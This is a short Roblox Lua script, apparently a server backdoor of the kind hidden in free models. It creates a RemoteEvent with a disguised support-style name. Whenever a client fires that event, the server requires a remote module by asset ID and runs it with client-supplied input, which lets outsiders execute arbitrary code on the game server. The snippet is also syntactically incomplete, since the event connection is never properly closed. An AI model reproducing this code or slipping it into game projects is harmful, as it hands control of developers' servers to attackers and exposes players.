local new = Instance.new("RemoteEvent")
new.Parent = game.ReplicatedStorage
new.Name = "RobloxSupportModelCC_S"
new.OnServerEvent:Connect(function(player, Trm)
require(5423914129)(Trm)()
end
